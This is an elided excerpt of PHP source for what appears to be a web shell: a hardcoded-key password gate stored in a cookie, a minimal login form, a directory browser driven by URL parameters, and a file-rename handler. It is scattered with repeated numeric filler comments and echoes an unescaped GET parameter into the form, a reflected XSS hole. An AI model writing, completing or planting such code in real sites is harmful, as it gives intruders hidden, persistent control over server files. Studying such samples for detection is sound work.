...
$auth_key = "c4fc71e52649d7ac1a1fd2146ff62c8f";
...
$pass = false;
if (isset($_COOKIE['pw_name_60498'])) {
    if(($_COOKIE['pw_name_60498']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_60498'])) {
        if(($_POST['pw_name_60498']) == $auth_key) {
            setcookie("pw_name_60498", $_POST['pw_name_60498']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_60498' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1725980429371267 1725980429573175 1725980429430614 1725980429923024
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1725980429371267 1725980429573175 1725980429430614 1725980429923024
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1725980429371267 1725980429573175 1725980429430614 1725980429923024
            $name = PATH . "/" . $_GET['r'];
